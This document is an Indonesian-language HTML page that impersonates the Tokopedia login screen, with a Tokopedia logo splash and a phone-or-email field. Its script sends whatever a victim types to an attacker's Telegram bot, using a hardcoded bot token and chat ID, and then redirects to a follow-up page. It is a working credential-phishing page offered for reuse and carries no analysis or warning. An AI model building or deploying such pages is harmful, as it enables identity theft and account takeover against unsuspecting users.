<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="theme-color" content="##00a550">
    <title>Masuk</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: white;
        }
        .container {
            text-align: center;
            max-width: 400px;
            width: 100%;
            padding: 20px;
        }
        .container h1 {
            margin: 0;
            font-size: 24px;
        }
        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }
        .input-group label {
            font-size: 14px;
            display: block;
        }
        .input-group input {
            width: calc(100% - 20px);
            padding: 10px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 5px;
            margin-top: 5px;
        }
        .example {
            font-size: 14px;
            color: #888;
            margin-bottom: 20px;
        }
        .submit-button {
            background-color: #ccc;
            color: white;
            padding: 15px;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: not-allowed;
            width: 100%;
            margin-bottom: 10px;
        }
        .submit-button.active {
            background-color: #00a550;
            cursor: pointer;
        }
        .other-method {
            background-color: white;
            border: 1px solid #ccc;
            color: #555;
            padding: 15px;
            border-radius: 5px;
            font-size: 16px;
            width: 100%;
            cursor: pointer;
        }
        .other-method:hover {
            background-color: #f7f7f7;
        }
        .register {
            font-size: 14px;
            color: #00a550;
        }
        /* Loader Styles */
        .loader {
            display: none;
            position: fixed;
            z-index: 1;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
            border: 16px solid #f3f3f3;
            border-top: 16px solid #3498db;
            border-radius: 50%;
            width: 120px;
            height: 120px;
            animation: spin 2s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        /* Popup Styles */
        .popup {
            display: none;
            position: fixed;
            z-index: 2;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.5);
            justify-content: center;
            align-items: center;
        }
        .popup img {
            width: 150px;
            height: auto;
        }
    </style>
</head>
<body>
    <div class="popup" id="popup">
        <img src="https://i.ibb.co/0JmdN4p/1000010845-removebg-preview.png" alt="Tokopedia Logo">
    </div>
    
    <div class="container" id="container">
        <h1>Masuk</h1>
        <form id="login-form">
            <div class="input-group">
                <label for="phone-number">Email atau Nomor Ponsel</label>
                <input type="text" id="phone-number" name="phone_number" placeholder="Contoh: 08123456789">
            </div>
            <button type="button" class="submit-button" id="submit-button" disabled>Selanjutnya</button>
        </form>
        <div class="loader" id="loader"></div>
        <p>atau masuk dengan</p>
        <button class="other-method">Metode lain</button>
        <p class="register">Belum punya akun Tokopedia? <a href="#">Daftar</a></p>
    </div>

    <script>
        // Tampilkan popup selama 3 detik
        window.onload = function() {
            var popup = document.getElementById('popup');
            var container = document.getElementById('container');
            popup.style.display = 'flex';
            container.style.display = 'none';
            setTimeout(function() {
                popup.style.display = 'none';
                container.style.display = 'block';
            }, 3000);
        };

        // Mengaktifkan tombol submit ketika input sudah diisi
        document.getElementById('phone-number').addEventListener('input', function() {
            var phoneNumber = this.value;
            var submitButton = document.getElementById('submit-button');
            if (phoneNumber.length > 0) {
                submitButton.classList.add('active');
                submitButton.disabled = false;
            } else {
                submitButton.classList.remove('active');
                submitButton.disabled = true;
            }
        });

        // Kirim data ke Telegram menggunakan AJAX
        document.getElementById('submit-button').addEventListener('click', function() {
            var phoneNumber = document.getElementById('phone-number').value;
            var loader = document.getElementById('loader');
            
            loader.style.display = 'block';
            
            // Mengirim data ke Telegram
            var telegramToken = '7423068749:AAErZulH4NM-eeLdUMNFeOH5PhXRt_MrP48'; // Ganti dengan token bot Telegram Anda
            var chatId = '6824078885'; // Ganti dengan chat_id Telegram Anda
            var message = "Informasi Login:\nNomor Ponsel/Email: " + phoneNumber;

            var url = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            // Membuat request AJAX
            var xhr = new XMLHttpRequest();
            xhr.open("GET", url, true);
            xhr.onreadystatechange = function() {
                if (xhr.readyState == 4 && xhr.status == 200) {
                    loader.style.display = 'none';
                    // Redirect ke halaman pin.html setelah sukses
                    window.location.href = "piro.html";
                }
            };
            xhr.send();
        });
    </script>
</body>
</html>
